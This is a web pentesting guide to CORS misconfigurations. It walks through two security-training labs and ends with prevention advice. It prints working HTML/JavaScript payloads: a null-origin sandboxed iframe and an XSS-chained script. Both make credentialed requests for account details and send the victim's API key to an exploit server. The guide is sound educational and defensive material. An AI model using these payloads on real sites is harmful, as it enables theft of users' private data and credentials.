---
title: "Guide to Cross-Origin Resource Sharing (CORS)"
date: 2025-02-23
categories: [Guides, Web Pentesting]
tags: [Guides, CSRF, Web Pentesting]
permalink: /posts/cors-guide
image:
  path: /assets/img/thumbnails/cors-guide.png
---



# Introduction to Cross-Origin Resource Sharing (CORS)

Cross-origin resource sharing (CORS) is a browser mechanism that enables controlled access to resources located outside of a given domain. It extends and adds flexibility to the **same-origin policy (SOP)**, which restricts how websites can interact with resources outside their source domain. While CORS provides greater flexibility for developers, it also introduces potential security risks if not configured properly.

## Table of Contents

1. [What is CORS?](#what-is-cors)
2. [Same-Origin Policy](#same-origin-policy)
3. [Relaxation of the Same-Origin Policy](#relaxation-of-the-same-origin-policy)
4. [Vulnerabilities Arising from CORS Misconfigurations](#vulnerabilities-arising-from-cors-misconfigurations)
5. [Exploiting CORS Misconfigurations](#exploiting-cors-misconfigurations)
6. [Preventing CORS-Based Attacks](#preventing-cors-based-attacks)
7. [Key Takeaways](#key-takeaways)

---

## What is CORS?

CORS is a mechanism that allows servers to specify which external domains are permitted to access their resources. It uses HTTP headers to define trusted origins and associated properties, such as whether authenticated access is allowed. For example:

```http
Access-Control-Allow-Origin: https://example.com
Access-Control-Allow-Credentials: true
```

These headers enable cross-origin requests while maintaining some level of control over who can access the resources.

---

## Same-Origin Policy

The **same-origin policy** is a restrictive cross-origin specification designed to prevent malicious cross-domain interactions. It limits a website's ability to interact with resources outside its source domain. For example:

- A script on `https://example.com` cannot directly access resources on `https://another-example.com`.
- However, it can issue requests to other domains, but it cannot access the responses unless explicitly allowed by CORS.

This policy was introduced to mitigate risks like one website stealing private data from another.

---

## Relaxation of the Same-Origin Policy

While the same-origin policy is effective at preventing unauthorized access, it can be overly restrictive for modern web applications that need to interact with subdomains or third-party services. To address this, developers use **cross-origin resource sharing (CORS)** to relax the same-origin policy in a controlled manner.

CORS works by using a suite of HTTP headers that define trusted origins and permissions. For example:

- The `Access-Control-Allow-Origin` header specifies which origins are allowed to access a resource.
- The `Access-Control-Allow-Credentials` header determines whether cookies and authentication tokens can be included in cross-origin requests.

---

## Vulnerabilities Arising from CORS Misconfigurations

Many modern websites use CORS to allow access from subdomains and trusted third parties. However, misconfigurations in CORS policies can lead to exploitable vulnerabilities. Common issues include:

1. **Reflecting Arbitrary Origins**: Allowing any origin by reflecting the `Origin` header without validation can expose sensitive data to malicious websites.
2. **Whitelist Implementation Errors**: Misconfigured whitelists (e.g., using prefix or suffix matching) can lead to unintended access.
3. **Null Origin Risks**: Whitelisting the `null` origin can introduce vulnerabilities, especially in edge cases like file-based requests or sandboxed environments.




---

## Exploiting CORS Misconfigurations

CORS misconfigurations can lead to serious vulnerabilities, allowing attackers to access sensitive data or perform unauthorized actions. Below, we'll walk through a step-by-step process to exploit a misconfigured CORS policy.

### Step-by-Step Walkthrough: Exploiting CORS Misconfigurations

#### **1. Initial Setup: Logging In and Observing Behavior**

- **Turn Off Intercept in Burp Suite**:
  
  Ensure that intercept is turned off in Burp Suite so that your browser can communicate with the target application without interruptions.

- **Log In to Your Account**:
  
  Use Burp's built-in browser to log in to your account on the target application. Once logged in, navigate to the "My Account" page.

- **Inspect the AJAX Request**:
  
  Open the **HTTP history** in Burp Suite and review the requests made when you access the "My Account" page. You should notice that your account details (including sensitive information like your API key) are retrieved via an **AJAX request** to the `/accountDetails` endpoint.

- **Check for CORS Headers**:
  
  Look at the response headers for this request. Specifically, check for the presence of the `Access-Control-Allow-Credentials: true` header. This header indicates that the server supports CORS and allows credentials (like cookies) to be sent with cross-origin requests. This is a potential indicator that the server may have a misconfigured CORS policy.

#### **2. Testing the CORS Policy**

- **Send the Request to Burp Repeater**:
  
  Right-click on the `/accountDetails` request in Burp's HTTP history and select **"Send to Repeater"**. This allows you to manually modify and resend the request.

- **Add the `Origin: null` Header**:
  
  In Burp Repeater, add a new header to the request:
  
  ```
  Origin: null
  ```
  
  This simulates a cross-origin request from a `null` origin, which can occur in certain edge cases (e.g., sandboxed iframes or file-based requests).

- **Resubmit the Request**:
  
  Send the modified request and observe the server's response. If the server reflects the `null` origin in the `Access-Control-Allow-Origin` header, it means the server is vulnerable to CORS misconfiguration. For example, the response might look like this:
  
  ```
  Access-Control-Allow-Origin: null
  Access-Control-Allow-Credentials: true
  ```
  
  This indicates that the server allows requests from the `null` origin and permits credentials (like cookies) to be included in those requests.

#### **3. Crafting the Exploit**

- **Go to the Exploit Server**:
  
  In the lab environment, navigate to the **exploit server** provided for testing. This server allows you to host malicious HTML/JavaScript code.

- **Enter the Malicious HTML Code**:
  
  Paste the following HTML code into the exploit server's input field. Replace `YOUR-LAB-ID` with the unique URL of your lab instance and `YOUR-EXPLOIT-SERVER-ID` with the ID of your exploit server:

  ```html
  <iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
      var req = new XMLHttpRequest();
      req.onload = reqListener;
      req.open('get','https://YOUR-LAB-ID.web-security-academy.net/accountDetails',true);
      req.withCredentials = true;
      req.send();

      function reqListener() {
          location='https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key='+this.responseText;
      };
  </script>"></iframe>
  ```

  **Explanation of the Code**:
  
  - The `<iframe>` element uses the `sandbox` attribute to create a restricted environment. This generates a `null` origin for the request.
  - Inside the iframe, JavaScript makes an AJAX request (`XMLHttpRequest`) to the `/accountDetails` endpoint of the target application.
  - The `withCredentials = true` setting ensures that cookies (and thus the victim's session) are included in the request.
  - When the response is received, the `reqListener` function redirects the browser to the exploit server's `/log` endpoint, appending the victim's API key (or other sensitive data) as a query parameter in the URL.

#### **4. Testing the Exploit**

- **View the Exploit**:
  
  Click the **"View exploit"** button on the exploit server. This simulates a victim visiting the malicious page.

- **Observe the Result**:
  
  After viewing the exploit, you should be redirected to the `/log` page on the exploit server. Check the URL of the page—it should now include the victim's API key as part of the query string. For example:
  
  ```
  https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key=VICTIM_API_KEY
  ```
  
  This confirms that the exploit successfully retrieved the victim's sensitive data.

#### **5. Delivering the Exploit to the Victim**

- **Deliver the Exploit**:
  
  Once you've confirmed that the exploit works, click the **"Deliver exploit to victim"** button. This simulates sending the malicious link to the victim.

- **Access the Log**:
  
  After delivering the exploit, go back to the exploit server and click **"Access log"**. The log will show the victim's API key, which was captured when they visited the malicious page.

- **Submit the Key**:
  
  Copy the victim's API key and submit it to complete the lab.

---




## Exploiting XSS via CORS Trust Relationships

Even when CORS is "correctly" configured, it inherently establishes a **trust relationship** between two origins. If a website trusts an origin that is vulnerable to **Cross-Site Scripting (XSS)**, an attacker can exploit the XSS vulnerability to inject malicious JavaScript. This injected script can then use CORS to retrieve sensitive information from the trusted site.

### How It Works

Consider the following request:

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: https://subdomain.vulnerable-website.com
Cookie: sessionid=...
```

If the server responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

This response indicates that `vulnerable-website.com` trusts requests originating from `https://subdomain.vulnerable-website.com`. If an attacker discovers an XSS vulnerability on `subdomain.vulnerable-website.com`, they can exploit it to inject malicious JavaScript that uses CORS to retrieve sensitive data (e.g., API keys) from `vulnerable-website.com`.

For example, the attacker could craft a URL like this:

```javascript
document.location = 'https://subdomain.vulnerable-website.com/?xss=<script>/*malicious code*/</script>';
```

The injected script would make a cross-origin request to `vulnerable-website.com` and exfiltrate sensitive information using the trust relationship established by CORS.

---

## Breaking TLS with Poorly Configured CORS

A poorly configured CORS policy can undermine the security benefits of HTTPS. For instance, if an application that strictly enforces HTTPS whitelists a trusted subdomain that uses plain HTTP, it creates a vulnerability. Consider the following request:

```http
GET /api/requestApiKey HTTP/1.1
Host: vulnerable-website.com
Origin: http://trusted-subdomain.vulnerable-website.com
Cookie: sessionid=...
```

If the server responds with:

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: http://trusted-subdomain.vulnerable-website.com
Access-Control-Allow-Credentials: true
```

This means that `vulnerable-website.com` trusts requests from `http://trusted-subdomain.vulnerable-website.com`, even though the subdomain uses plain HTTP. An attacker could intercept or manipulate the insecure HTTP traffic to steal sensitive data or perform malicious actions.

---

### Example Exercise: Exploiting CORS Misconfiguration via XSS

#### Step-by-Step Walkthrough

1. **Initial Setup: Logging In and Observing Behavior**
   - **Turn Off Intercept in Burp Suite**: Ensure that intercept is turned off so your browser can communicate with the target application without interruptions.
   - **Log In and Access Your Account Page**: Use Burp's built-in browser to log in to your account and navigate to the account page.
   - **Inspect the AJAX Request**: Open the **HTTP history** in Burp Suite and observe that your account details (including sensitive information like your API key) are retrieved via an AJAX request to `/accountDetails`.
   - **Check for CORS Headers**: Look at the response headers for this request. Specifically, check for the presence of the `Access-Control-Allow-Credentials: true` header, which suggests that the server supports CORS.

2. **Testing the CORS Configuration**
   - **Send the Request to Burp Repeater**: Right-click on the `/accountDetails` request in Burp's HTTP history and select **"Send to Repeater"**.
   - **Add the `Origin` Header**: Modify the request by adding the following header:
     ```
     Origin: http://stock.YOUR-LAB-ID.web-security-academy.net
     ```
   - **Resubmit the Request**: Send the modified request and observe the server's response. If the `Origin` is reflected in the `Access-Control-Allow-Origin` header, it confirms that the CORS configuration allows access from arbitrary subdomains, including both HTTPS and HTTP.

3. **Identifying an XSS Vulnerability**
   - **Open a Product Page**: Navigate to a product page and click **"Check stock"**.
   - **Observe the HTTP URL**: Notice that the stock-checking functionality is loaded using an HTTP URL on a subdomain (e.g., `http://stock.YOUR-LAB-ID.web-security-academy.net`).
   - **Test for XSS**: Observe that the `productID` parameter is vulnerable to XSS. For example, you can inject a payload like `<script>alert(1)</script>` into the `productID` parameter to confirm the vulnerability.

4. **Crafting the Exploit**
   - **Go to the Exploit Server**: Navigate to the exploit server provided in the lab environment.
   - **Enter the Malicious HTML Code**: Paste the following HTML code into the exploit server's input field. Replace `YOUR-LAB-ID` with your unique lab domain name and `YOUR-EXPLOIT-SERVER-ID` with your exploit server ID:

     ```html
     <script>
         document.location = 'http://stock.YOUR-LAB-ID.web-security-academy.net/?productId=<script>var req = new XMLHttpRequest();req.onload=reqListener;req.open("get","https://YOUR-LAB-ID.web-security-academy.net/accountDetails",true);req.withCredentials=true;req.send();function reqListener(){location="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/log?key="+this.responseText;};</script>';
     </script>
     ```

     **Explanation of the Code**:
     - The `document.location` redirects the victim to the vulnerable subdomain (`stock.YOUR-LAB-ID.web-security-academy.net`) with an XSS payload embedded in the `productID` parameter.
     - The injected script makes a CORS request to `/accountDetails` on the main domain (`YOUR-LAB-ID.web-security-academy.net`) to retrieve the victim's API key.
     - The API key is then exfiltrated to the exploit server by appending it as a query parameter in the URL.

5. **Testing the Exploit**
   - **View the Exploit**: Click the **"View exploit"** button on the exploit server to simulate a victim visiting the malicious page.
   - **Observe the Result**: After viewing the exploit, you should be redirected to the `/log` page on the exploit server. Check the URL—it should now include the victim's API key as part of the query string.

6. **Delivering the Exploit to the Victim**
   - **Deliver the Exploit**: Once you've confirmed that the exploit works, click the **"Deliver exploit to victim"** button to simulate sending the malicious link to the victim.
   - **Access the Log**: Go back to the exploit server and click **"Access log"**. Retrieve the victim's API key from the log and submit it to complete the lab.

---

## Intranets and CORS Without Credentials

Most CORS attacks rely on the presence of the following response header:

```http
Access-Control-Allow-Credentials: true
```

This header allows the victim's browser to send cookies and other credentials with cross-origin requests. Without this header, the browser will **refuse to send cookies**, meaning the attacker will only gain access to **unauthenticated content**. In such cases, the attacker could just as easily access the same content by browsing directly to the target website.

However, there is one common scenario where an attacker **cannot access a website directly**: when the target is part of an organization's **intranet** and located within private IP address space. Internal websites are often held to a lower security standard than external sites, making them more vulnerable to exploitation. Attackers can leverage these vulnerabilities to gain further access within the private network.

---

### Example Scenario: Exploiting CORS in an Intranet

#### Request

```http
GET /reader?url=doc1.pdf
Host: intranet.normal-website.com
Origin: https://external-site.com
```

#### Response

```http
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
```

#### Key Observations

1. **Unrestricted Access (`Access-Control-Allow-Origin: *`)**:
   - The server responds with `Access-Control-Allow-Origin: *`, allowing any origin to access the resource.
   - Since no credentials are required (`Access-Control-Allow-Credentials` is absent), the attacker cannot retrieve sensitive data tied to the user's session (e.g., cookies or tokens).

2. **Internal Network Context**:
   - The target (`intranet.normal-website.com`) is part of the organization's internal network and is not directly accessible from the public internet.
   - Attackers cannot browse to this site directly but can exploit CORS misconfigurations to probe or interact with it indirectly.

3. **Potential for Exploitation**:
   - Even without credentials, attackers can use CORS to access **unauthenticated content** hosted on the intranet.
   - For example, they might retrieve sensitive documents, configuration files, or other resources that are publicly accessible within the private network.

---

### Why This Matters

1. **Lower Security Standards for Internal Sites**:
   - Internal websites are often less rigorously secured than external-facing applications. Developers may assume that these sites are safe because they are hidden behind a firewall or NAT.
   - Misconfigured CORS policies on internal sites can expose them to attacks from compromised machines within the network or through malicious external actors exploiting vulnerabilities like SSRF (Server-Side Request Forgery).

2. **Access to Unauthenticated Content**:
   - While unauthenticated content may seem harmless, it can still contain sensitive information such as internal documentation, API endpoints, or debugging tools.
   - Attackers can use this information to escalate their privileges or pivot to other parts of the network.

3. **Exploiting Trust Relationships**:
   - Many organizations trust their internal systems implicitly, even when those systems are poorly secured.
   - A misconfigured CORS policy on an internal site can allow attackers to bypass network segmentation and access resources they should not be able to reach.

---

### Mitigation Strategies

1. **Restrict `Access-Control-Allow-Origin`**:
   - Avoid using `Access-Control-Allow-Origin: *` unless absolutely necessary. Instead, explicitly whitelist trusted origins.

2. **Disable CORS for Sensitive Endpoints**:
   - For internal APIs or resources that do not need to be accessed cross-origin, disable CORS entirely.

3. **Implement Network Segmentation**:
   - Ensure that internal websites are properly isolated from external networks and that only authorized users and systems can access them.

4. **Regular Security Audits**:
   - Regularly audit internal systems for vulnerabilities, including CORS misconfigurations, to prevent attackers from exploiting them.

---




## Preventing CORS-Based Attacks

CORS vulnerabilities primarily arise due to **misconfigurations** in how cross-origin requests are handled. As such, preventing these attacks is largely a matter of proper configuration. Below are some effective strategies to defend against CORS-based attacks.

---

### 1. Proper Configuration of Cross-Origin Requests

If a web resource contains sensitive information, the `Access-Control-Allow-Origin` header should be carefully and explicitly configured. Avoid overly permissive settings that could expose your application to unnecessary risks.

#### Key Recommendations:

- **Specify Trusted Origins Explicitly**:
  
  Only allow trusted origins in the `Access-Control-Allow-Origin` header. For example:

  ```http
  Access-Control-Allow-Origin: https://trusted-domain.com
  ```

  This ensures that only requests from explicitly trusted domains are permitted.

- **Avoid Dynamically Reflecting Origins Without Validation**:
  
  Dynamically reflecting the value of the `Origin` header (e.g., copying it directly into the `Access-Control-Allow-Origin` response) without proper validation is highly exploitable. Always validate the origin against a whitelist of trusted domains before allowing access.

---

### 2. Only Allow Trusted Sites

This may seem obvious, but it bears repeating: **only trusted sites should be specified in the `Access-Control-Allow-Origin` header**. Misconfigured or overly permissive CORS policies can lead to serious security vulnerabilities.

#### Why It Matters:

- Allowing untrusted origins can enable attackers to bypass the same-origin policy and access sensitive resources.
- For example, an attacker could exploit a misconfigured CORS policy to steal private data or perform unauthorized actions on behalf of a user.

---

### 3. Avoid Whitelisting `null`

Avoid using the following header:

```http
Access-Control-Allow-Origin: null
```

#### Why It's Dangerous:

- The `null` origin can be specified in certain edge cases, such as:
  - Requests from internal documents (e.g., `file://` URLs).
  - Sandboxed iframes with restricted permissions.
- Allowing `null` as a valid origin can inadvertently grant access to malicious actors who craft requests with this origin.

#### Best Practice:

- Define CORS headers with respect to **explicitly trusted origins** for both private and public servers. Never use `null` as a valid origin unless absolutely necessary, and even then, ensure strict validation.

---

### 4. Avoid Wildcards in Internal Networks

Avoid using wildcards (`*`) in internal networks. While wildcards may seem convenient, they can introduce significant risks, especially in environments where sensitive data is stored.

#### Why It's Dangerous:

- Using `Access-Control-Allow-Origin: *` allows any website to access your resources, which is particularly risky for internal APIs or services.
- Trusting network configuration alone (e.g., firewalls or NAT) to protect internal resources is insufficient. If an internal browser accesses an untrusted external domain, it could expose sensitive data to attackers.

#### Best Practice:

- Explicitly whitelist trusted origins, even for internal services. For example:

  ```http
  Access-Control-Allow-Origin: https://internal-service.trusted-domain.com
  ```

---

### 5. CORS Is Not a Substitute for Server-Side Security Policies

It’s crucial to understand that **CORS is not a replacement for server-side security measures**. CORS defines browser behavior but does not inherently protect sensitive data on the server.

#### Why It Matters:

- An attacker can directly forge requests from trusted origins, bypassing CORS entirely. For example, tools like `curl` or Postman can send requests without adhering to CORS restrictions.
- Therefore, sensitive data must always be protected using additional server-side mechanisms, such as:
  - **Authentication**: Ensure that only authorized users can access sensitive resources.
  - **Session Management**: Use secure session tokens and enforce proper session expiration policies.
  - **Input Validation**: Validate all inputs to prevent injection attacks and other vulnerabilities.

---

## Summary of Key Points

1. **Explicitly Specify Trusted Origins**:
   - Avoid dynamically reflecting origins or using wildcards (`*`) in the `Access-Control-Allow-Origin` header.

2. **Avoid Whitelisting `null`**:
   - The `null` origin can be exploited in edge cases, so it should never be used as a valid origin.

3. **Secure Internal Networks**:
   - Even in internal networks, avoid wildcards and explicitly whitelist trusted origins to prevent unauthorized access.

4. **Combine CORS with Server-Side Protections**:
   - CORS is not a substitute for server-side security. Always implement authentication, session management, and input validation to protect sensitive data.


